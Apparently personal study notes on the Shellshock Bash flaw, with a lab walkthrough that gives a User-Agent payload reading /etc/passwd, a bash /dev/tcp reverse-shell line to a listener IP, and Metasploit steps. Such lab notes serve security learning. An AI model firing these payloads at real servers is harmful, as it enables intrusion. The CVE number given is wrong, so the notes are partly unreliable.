Linux vulnerabilities
#### shellshock
- Shellshock(CVE-2014-6217) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitary commands via Bash,consequently allowing the attacker to obtain remote access to the target system via a reverse shell.
- The shellshock vulnerabilities was discovered by Stephane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.
- Bash is a Nix shell that is part of the GNU project and is hte default shell for most linux distributions.
- The Shellshock vulnerability is caused by a vulnerability in Bash,whereby Bash mistakenly executes training commmands after a series of characters () { :; };
- This vulnerability only affects linux as Windows does not use utilize Bash as it is not a Nix based operating system.
- In the context of remote exploitation,Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
- CGI(Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the linux system,after which the output is displayed to the client.
#### shellshock Exploitation
- In order to exploit this vulnerability,you will need to locate an input vector or script that allows you to communicate with Bash.
- In the context of an Apache web server,we can utilize any legitimate CGI  scripts accessible on the web server.
- Whenever a CGI  script is executed,the web server will initiate a new process and run the CGI script with Bash.
- This vulnerabiity can be exploited both manually and automatically with the use of an MSF exploit module.
#### Lab
- nmap -sV 192.24.241.3 [ this shows the services]
- browse the ip 
- look the source ip.
- here we see  CGI script which is under / directory,so it is publicly accessible by 192.24.241.3/gettime.cgi
- nmap -sv 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" [ this will confirm the vulnerability ]
- Now capture the browser request in burp and send it to repeater.
- () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' [ remove the User Agent and set it instead user agent ]
- move to anothe tab and start netcat listner [ nc -nvlp 1234 ]
- () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
- send the request
- this will give us a  shell in netcat listener
#### Metasploit
- service postgresql start
- msfconsole
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set RHOSTS and TARGETURI
- run
- this give us meterpreter session
